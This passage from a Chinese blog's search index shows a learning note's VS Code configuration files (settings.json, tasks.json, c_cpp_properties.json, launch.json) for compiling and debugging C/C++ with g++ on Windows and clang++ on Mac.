punctuation">,</span><span class="token comment">//据说可以减少vscode的CPU和内存占用</span>    <span class="token comment">/*window*/</span>    <span class="token property">"window.menuBarVisibility"</span><span class="token operator">:</span> <span class="token string">"visible"</span><span class="token punctuation">,</span><span class="token comment">//在全屏模式下仍然显示窗口顶部菜单（没有菜单很难受）</span>    <span class="token property">"window.dialogStyle"</span><span class="token operator">:</span> <span class="token string">"custom"</span><span class="token punctuation">,</span><span class="token comment">//使用更具有VSCode的UI风格的弹窗提示（更美观）</span>    <span class="token comment">/*debug*/</span>    <span class="token property">"debug.internalConsoleOptions"</span><span class="token operator">:</span> <span class="token string">"openOnSessionStart"</span><span class="token punctuation">,</span><span class="token comment">//每次调试都打开调试控制台，方便调试</span>    <span class="token property">"debug.showBreakpointsInOverviewRuler"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span><span class="token comment">//在滚动条标尺上显示断点的位置，便于查找断点的位置</span>    <span class="token property">"debug.toolBarLocation"</span><span class="token operator">:</span> <span class="token string">"docked"</span><span class="token punctuation">,</span><span class="token comment">//固定调试时工具条的位置，防止遮挡代码内容（个人喜好）</span>    <span class="token property">"debug.saveBeforeStart"</span><span class="token operator">:</span> <span class="token string">"nonUntitledEditorsInActiveGroup"</span><span class="token punctuation">,</span><span class="token comment">//在启动调试会话前保存除了无标题文档以外的文档（毕竟你创建了无标题文档就说明你根本没有想保存它的意思（至少我是这样的。））</span>    <span class="token property">"debug.onTaskErrors"</span><span class="token operator">:</span> <span class="token string">"showErrors"</span><span class="token punctuation">,</span><span class="token comment">//预启动任务出错后显示错误，并不启动调试</span>    <span class="token comment">/*html*/</span>    <span class="token property">"html.format.indentHandlebars"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>    <span class="token property">"workbench.editor.empty.hint"</span><span class="token operator">:</span> <span class="token string">"hidden"</span> <span class="token punctuation">,</span><span class="token comment">//在写包含形如&#123;&#123;xxx&#125;&#125;的标签的html文档时，也对标签进行缩进（更美观）</span>    <span class="token property">"code-runner.executorMap"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>    <span class="token property">"cpp"</span><span class="token operator">:</span> <span class="token string">"cd $dir &amp;&amp; g++ -std=c++17 $fileName -g -o $test.exe -std=c++11 &amp;&amp; $dir$test.exe"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token property">"code-runner.runInTerminal"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>    <span class="token property">"files.associations"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token property">"ostream"</span><span class="token operator">:</span> <span class="token string">"cpp"</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="tasks-json"><a href="#tasks-json" class="headerlink" title="tasks.json"></a>tasks.json</h3><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>    <span class="token comment">// See https://go.microsoft.com/fwlink/?LinkId=733558 </span>    <span class="token comment">// for the documentation about the tasks.json format</span>    <span class="token property">"version"</span><span class="token operator">:</span> <span class="token string">"2.0.0"</span><span class="token punctuation">,</span>    <span class="token property">"tasks"</span><span class="token operator">:</span> <span class="token punctuation">[</span>        <span class="token punctuation">&#123;</span>        <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"shell"</span><span class="token punctuation">,</span>        <span class="token property">"label"</span><span class="token operator">:</span> <span class="token string">"task g++"</span><span class="token punctuation">,</span>        <span class="token property">"command"</span><span class="token operator">:</span> <span class="token string">"C:\\mingw64\\bin\\g++.exe"</span><span class="token punctuation">,</span><span class="token comment">/*修改成自己bin目录下的g++.exe，这里的路径和电脑里复制的文件目录有一点不一样，这里是两个反斜杠\\*/</span>        <span class="token property">"args"</span><span class="token operator">:</span> <span class="token punctuation">[</span>            <span class="token string">"-g"</span><span class="token punctuation">,</span>            <span class="token string">"$&#123;file&#125;"</span><span class="token punctuation">,</span>            <span class="token string">"-o"</span><span class="token punctuation">,</span>            <span class="token string">"$&#123;workspaceFolder&#125;\\test.exe"</span><span class="token punctuation">,</span>            <span class="token string">"-I"</span><span class="token punctuation">,</span>            <span class="token string">"E:\\Cpp code"</span><span class="token punctuation">,</span>      <span class="token comment">/*修改成自己放c/c++项目的文件夹，这里的路径和电脑里复制的文件目录有一点不一样，这里是两个反斜杠\\*/</span>            <span class="token string">"-std=c++17"</span>        <span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token property">"options"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"cwd"</span><span class="token operator">:</span> <span class="token string">"C:\\mingw64\\bin"</span><span class="token comment">/*修改成自己bin目录，这里的路径和电脑里复制的文件目录有一点不一样，这里是两个反斜杠\\*/</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token property">"problemMatcher"</span><span class="token operator">:</span><span class="token punctuation">[</span>            <span class="token string">"$gcc"</span>        <span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token property">"group"</span><span class="token operator">:</span> <span class="token string">"build"</span><span class="token punctuation">,</span>                <span class="token punctuation">&#125;</span>    <span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="MAC中vscode的四个文件配置"><a href="#MAC中vscode的四个文件配置" class="headerlink" title="MAC中vscode的四个文件配置"></a>MAC中vscode的四个文件配置</h2><h3 id="c-cpp-properties-json-1"><a href="#c-cpp-properties-json-1" class="headerlink" title="c_cpp_properties.json"></a>c_cpp_properties.json</h3><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>    <span class="token property">"configurations"</span><span class="token operator">:</span> <span class="token punctuation">[</span>        <span class="token punctuation">&#123;</span>            <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"Mac"</span><span class="token punctuation">,</span>            <span class="token property">"includePath"</span><span class="token operator">:</span> <span class="token punctuation">[</span>                <span class="token string">"$&#123;workspaceFolder&#125;/**"</span><span class="token punctuation">,</span>            <span class="token punctuation">]</span><span class="token punctuation">,</span>            <span class="token property">"defines"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>            <span class="token property">"macFrameworkPath"</span><span class="token operator">:</span> <span class="token punctuation">[</span>                <span class="token string">"/Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/System/Library/Frameworks"</span>            <span class="token punctuation">]</span><span class="token punctuation">,</span>            <span class="token property">"compilerPath"</span><span class="token operator">:</span> <span class="token string">"/usr/bin/clang++"</span><span class="token punctuation">,</span>            <span class="token property">"cStandard"</span><span class="token operator">:</span> <span class="token string">"c17"</span><span class="token punctuation">,</span>            <span class="token property">"cppStandard"</span><span class="token operator">:</span> <span class="token string">"c++17"</span><span class="token punctuation">,</span>            <span class="token property">"intelliSenseMode"</span><span class="token operator">:</span> <span class="token string">"macos-clang-arm64"</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token property">"version"</span><span class="token operator">:</span> <span class="token number">4</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="launcn-json"><a href="#launcn-json" class="headerlink" title="launcn.json"></a>launcn.json</h3><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>    <span class="token comment">// 使用 IntelliSense 了解相关属性。 </span>    <span class="token comment">// 悬停以查看现有属性的描述。</span>    <span class="token comment">// 欲了解更多信息，请访问: https://go.microsoft.com/fwlink/?linkid=830387</span>    <span class="token property">"version"</span><span class="token operator">:</span> <span class="token string">"0.2.0"</span><span class="token punctuation">,</span>    <span class="token property">"configurations"</span><span class="token operator">:</span> <span class="token punctuation">[</span>        <span class="token punctuation">&#123;</span>            <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"lldb"</span><span class="token punctuation">,</span>            <span class="token property">"request"</span><span class="token operator">:</span> <span class="token string">"launch"</span><span class="token punctuation">,</span>            <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"Debug"</span><span class="token punctuation">,</span>           <span class="token property">"program"</span><span class="token operator">:</span>  <span class="token string">"$&#123;workspaceFolder&#125;//test"</span><span class="token punctuation">,</span>            <span class="token property">"args"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>           <span class="token property">"cwd"</span><span class="token operator">:</span> <span class="token string">"$&#123;workspaceFolder&#125;"</span><span class="token punctuation">,</span>           <span class="token property">"preLaunchTask"</span><span class="token operator">:</span> <span class="token string">"C/C++: clang++ 生成活动文件"</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="settings-json-1"><a href="#settings-json-1" class="headerlink" title="settings.json"></a>settings.json</h3><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>    <span class="token property">"code-runner.runInTerminal"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>    <span class="token property">"code-runner.saveAllFilesBeforeRun"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>    <span class="token property">"code-runner.saveFileBeforeRun"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>    <span class="token property">"code-runner.preserveFocus"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>    <span class="token property">"cmake.configureOnOpen"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>    <span class="token property">"explorer.confirmDelete"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>    <span class="token property">"editor.fontSize"</span><span class="token operator">:</span> <span class="token number">18</span><span class="token punctuation">,</span>    <span class="token property">"editor.fontFamily"</span><span class="token operator">:</span> <span class="token string">"Fira Code"</span><span class="token punctuation">,</span>    <span class="token property">"explorer.confirmDragAndDrop"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>    <span class="token property">"files.autoSave"</span><span class="token operator">:</span> <span class="token string">"onFocusChange"</span><span class="token punctuation">,</span>    <span class="token property">"editor.fontLigatures"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>    <span class="token property">"editor.fontWeight"</span><span class="token operator">:</span> <span class="token string">"normal"</span><span class="token punctuation">,</span>    <span class="token property">"workbench.iconTheme"</span><span class="token operator">:</span> <span class="token string">"material-icon-theme"</span><span class="token punctuation">,</span>    <span class="token property">"terminal.integrated.enableMultiLinePasteWarning"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>    <span class="token property">"code-runner.executorMap"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token property">"cpp"</span><span class="token operator">:</span> <span class="token string">"cd $dir &amp;&amp; clang++ -std=c++17 $fileName -o $test.out &amp;&amp; $dir$test.out"</span><span class="token punctuation">,</span>        <span class="token property">"python"</span><span class="token operator">:</span> <span class="token string">"cd $dir &amp;&amp; python3 $fileName"</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token property">"files.associations"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        <span class="token property">"__bit_reference"</span><span class="token operator">:</span> <span class="token string">"cpp"</span><span class="token punctuation">,</span>        <span class="token property">"__config"</span><span class="token operator">:</span> <span class="token string">"cpp"</span><span class="token punctuation">,</span>        <span class="token property">"__debug"</span><span class="token operator">:</span> <span class="token string">"cpp"</span><span class="token punctuation">,</span>        <span class="token property">"__errc"</span><span class="token operator">:</span> <span class="token string">"cpp"</span><span class="token punctuation">,</span>        <span class="token property">"__hash_table"</span><span class="token operator">:</span> <span class="token string">"cpp"</span><span class="token punctuation">,</span>        <span class="token property">"__locale"</span><span class="token operator">:</span> <span class="token string">"cpp"</span><span class="token punctuation">,</span>        <span class="token property">"__mutex_base"</span><span class="token operator">:</span> <span class="token string">"cpp"</span><span class="token punctuation">,</span>        <span class="token property">"__node_handle"</span><span class="token operator">:</span> <span class="token string">"cpp"</span><span class="token punctuation">,</span>        <span class="token property">"__split_buffer"</span><span class="token operator">:</span> <span class="token string">"cpp"</span><span class="token punctuation">,</span>        <span class="token property">"__threading_support"</span><span class="token operator">:</span> <span class="token string">"cpp"</span><span class="token punctuation">,</span>        <span class="token property">"__tree"</span><span class="token operator">:</span> <span class="token string">"cpp"</span><span class="token punctuation">,</span>        <span class="token property">"__verbose_abort"</span><span class="token operator">:</span> <span class="token string">"cpp"</span><span class="token punctuation">,</span>        <span class="token property">"array"</span><span class="token operator">:</span> <span class="token string">"cpp"</span><span class="token punctuation">,</span>        <span class="token property">"atomic"</span><span class="token operator">:</span> <span class="token string">"cpp"</span><span class="token punctuation">,</span>        <span class="token property">"bitset"</span><span class="token operator">:</span> <span class="token string">"cpp"</span><span class="token punctuation">,</span>        <span class="token property">"cctype"</span><span class="token operator">:</span> <span class="token string">"cpp"</span><span class="token punctuation">,</span>        <span class="token property">"charconv"</span><span class="token operator">:</span> <span class="token string">"cpp"</span><span class="token punctuation">,</span>        <span class="token property">"clocale"</span><span class="token operator">:</span> <span class="token string">"cpp"</span><span class="token punctuation">,</span>        <span class="token property">"cmath"</span><span class="token operator">:</span> <span class="token string">"cpp"</span><span class="token punctuation">,</span>        <span class="token property">"complex"</span><span class="token operator">:</span> <span class="token string">"cpp"</span><span class="token punctuation">,</span>        <span class="token property">"cstdarg"</span><span class="token operator">:</span> <span class="token string">"cpp"</span><span class="token punctuation">,</span>        <span class="token property">"cstddef"</span><span class="token operator">:</span> <span class="token string">"cpp"</span><span class="token punctuation">,</span>        <span class="token property">"cstdint"</span><span class="token operator">:</span> <span class="token string">"cpp"</span><span class="token punctuation">,</span>        <span class="token property">"cstdio"</span><span class="token operator">:</span> <span class="token string">"cpp"</span><span class="token punctuation">,</span>        <span class="token property">"cstdlib"</span><span class="token operator">:</span> <span class="token string">"cpp"</span><span class="token punctuation">,</span>        <span class="token property">"cstring"</span><span class="token operator">:</span> <span class="token string">"cpp"</span><span class="token punctuation">,</span>        <span class="token property">"ctime"</span><span class="token operator">:</span> <span class="token string">"cpp"</span><span class="token punctuation">,</span>        <span class="token property">"cwchar"</span><span class="token operator">:</span> <span class="token string">"cpp"</span><span class="token punctuation">,</span>        <span class="token property">"cwctype"</span><span class="token operator">:</span> <span class="token string">"cpp"</span><span class="token punctuation">,</span>        <span class="token property">"deque"</span><span class="token operator">:</span> <span class="token string">"cpp"</span><span class="token punctuation">,</span>        <span class="token property">"exception"</span><span class="token operator">:</span> <span class="token string">"cpp"</span><span class="token punctuation">,</span>        <span class="token property">"initializer_list"</span><span class="token operator">:</span> <span class="token string">"cpp"</span><span class="token punctuation">,</span>        <span class="token property">"iomanip"</span><span class="token operator">:</span> <span class="token string">"cpp"</span><span class="token punctuation">,</span>        <span class="token property">"ios"</span><span class="token operator">:</span> <span class="token string">"cpp"</span><span class="token punctuation">,</span>        <span class="token property">"iosfwd"</span><span class="token operator">:</span> <span class="token string">"cpp"</span><span class="token punctuation">,</span>        <span class="token property">"iostream"</span><span class="token operator">:</span> <span class="token string">"cpp"</span><span class="token punctuation">,</span>        <span class="token property">"istream"</span><span class="token operator">:</span> <span class="token string">"cpp"</span><span class="token punctuation">,</span>        <span class="token property">"limits"</span><span class="token operator">:</span> <span class="token string">"cpp"</span><span class="token punctuation">,</span>        <span class="token property">"locale"</span><span class="token operator">:</span> <span class="token string">"cpp"</span><span class="token punctuation">,</span>        <span class="token property">"map"</span><span class="token operator">:</span> <span class="token string">"cpp"</span><span class="token punctuation">,</span>        <span class="token property">"mutex"</span><span class="token operator">:</span> <span class="token string">"cpp"</span><span class="token punctuation">,</span>        <span class="token property">"new"</span><span class="token operator">:</span> <span class="token string">"cpp"</span><span class="token punctuation">,</span>        <span class="token property">"optional"</span><span class="token operator">:</span> <span class="token string">"cpp"</span><span class="token punctuation">,</span>        <span class="token property">"ostream"</span><span class="token operator">:</span> <span class="token string">"cpp"</span><span class="token punctuation">,</span>        <span class="token property">"queue"</span><span class="token operator">:</span> <span class="token string">"cpp"</span><span class="token punctuation">,</span>        <span class="token property">"ratio"</span><span class="token operator">:</span> <span class="token string">"cpp"</span><span class="token punctuation">,</span>        <span class="token property">"set"</span><span class="token operator">:</span> <span class="token string">"cpp"</span><span class="token punctuation">,</span>        <span class="token property">"sstream"</span><span class="token operator">:</span> <span class="token string">"cpp"</span><span class="token punctuation">,</span>        <span class="token property">"stack"</span><span class="token operator">:</span> <span class="token string">"cpp"</span><span class="token punctuation">,</span>        <span class="token property">"stdexcept"</span><span class="token operator">:</span> <span class="token string">"cpp"</span><span class="token punctuation">,</span>        <span class="token property">"streambuf"</span><span class="token operator">:</span> <span class="token string">"cpp"</span><span class="token punctuation">,</span>        <span class="token property">"string"</span><span class="token operator">:</span> <span class="token string">"cpp"</span><span class="token punctuation">,</span>        <span class="token property">"string_view"</span><span class="token operator">:</span> <span class="token string">"cpp"</span><span class="token punctuation">,</span>        <span class="token property">"system_error"</span><span class="token operator">:</span> <span class="token string">"cpp"</span><span class="token punctuation">,</span>        <span class="token property">"tuple"</span><span class="token operator">:</span> <span class="token string">"cpp"</span><span class="token punctuation">,</span>        <span class="token property">"typeinfo"</span><span class="token operator">:</span> <span class="token string">"cpp"</span><span class="token punctuation">,</span>        <span class="token property">"unordered_map"</span><span class="token operator">:</span> <span class="token string">"cpp"</span><span class="token punctuation">,</span>        <span class="token property">"variant"</span><span class="token operator">:</span> <span class="token string">"cpp"</span><span class="token punctuation">,</span>        <span class="token property">"vector"</span><span class="token operator">:</span> <span class="token string">"cpp"</span><span class="token punctuation">,</span>        <span class="token property">"__bits"</span><span class="token operator">:</span> <span class="token string">"cpp"</span><span class="token punctuation">,</span>        <span class="token property">"__nullptr"</span><span class="token operator">:</span> <span class="token string">"cpp"</span><span class="token punctuation">,</span>        <span class="token property">"__string"</span><span class="token operator">:</span> <span class="token string">"cpp"</span><span class="token punctuation">,</span>        <span class="token property">"__tuple"</span><span class="token operator">:</span> <span class="token string">"cpp"</span><span class="token punctuation">,</span>        <span class="token property">"bit"</span><span class="token operator">:</span> <span class="token string">"cpp"</span><span class="token punctuation">,</span>        <span class="token property">"chrono"</span><span class="token operator">:</span> <span class="token string">"cpp"</span><span class="token punctuation">,</span>        <span class="token property">"compare"</span><span class="token operator">:</span> <span class="token string">"cpp"</span><span class="token punctuation">,</span>        <span class="token property">"concepts"</span><span class="token operator">:</span> <span class="token string">"cpp"</span><span class="token punctuation">,</span>        <span class="token property">"memory"</span><span class="token operator">:</span> <span class="token string">"cpp"</span><span class="token punctuation">,</span>        <span class="token property">"type_traits"</span><span class="token operator">:</span> <span class="token string">"cpp"</span><span class="token punctuation">,</span>        <span class="token property">"algorithm"</span><span class="token operator">:</span> <span class="token string">"cpp"</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="tasks-json-1"><a href="#tasks-json-1" class="headerlink" title="tasks.json"></a>tasks.json</h3><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>    <span class="token property">"tasks"</span><span class="token operator">:</span> <span class="token punctuation">[</span>        <span class="token punctuation">&#123;</span>            <span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"cppbuild"</span><span class="token punctuation">,</span>            <span class="token property">"label"</span><span class="token operator">:</span> <span class="token string">"C/C++: clang++ 生成活动文件"</span><span class="token punctuation">,</span>            <span class="token property">"command"</span><span class="token operator">:</span> <span class="token string">"/usr/bin/clang++"</span><span class="token punctuation">,</span>            <span class="token property">"args"</span><span class="token operator">:</span> <span class="token punctuation">[</span>                <span class="token string">"-fcolor-diagnostics"</span><span class="token punctuation">,</span>                <span class="token string">"-fansi-escape-codes"</span><span class="token punctuation">,</span>                <span class="token string">"-g"</span><span class="token punctuation">,</span>                <span class="token string">"$&#123;file&#125;"</span><span class="token punctuation">,</span>                <span class="token string">"-o"</span><span class="token punctuation">,</span>                <span class="token string">"$&#123;workspaceFolder&#125;//test"</span><span class="token punctuation">,</span>                <span class="token string">"-std=c++11"</span>            <span class="token punctuation">]</span><span class="token punctuation">,</span>            <span class="token property">"options"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                <span class="token property">"cwd"</span><span class="token operator">:</span> <span class="token string">"$&#123;fileDirname&#125;"</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>            <span class="token property">"problemMatcher"</span><span class="token operator">:</span> <span class="token punctuation">[</span>                <span class="token string">"$gcc"</span>            <span class="token punctuation">]</span><span class="token punctuation">,</span>            <span class="token property">"group"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                <span class="token property">"kind"</span><span class="token operator">:</span> <span class="token string">"build"</span><span class="token punctuation">,</span>                <span class="token property">"isDefault"</span><span class="token operator">:</span> <span class="token boolean">true</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>            <span class="token property">"detail"</span><span class="token operator">:</span> <span class="token string">"调试器生成的任务。"</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token property">"version"</span><span class="token operator">:</span> <span class="token string">"2.0.0"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> EATPOOP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
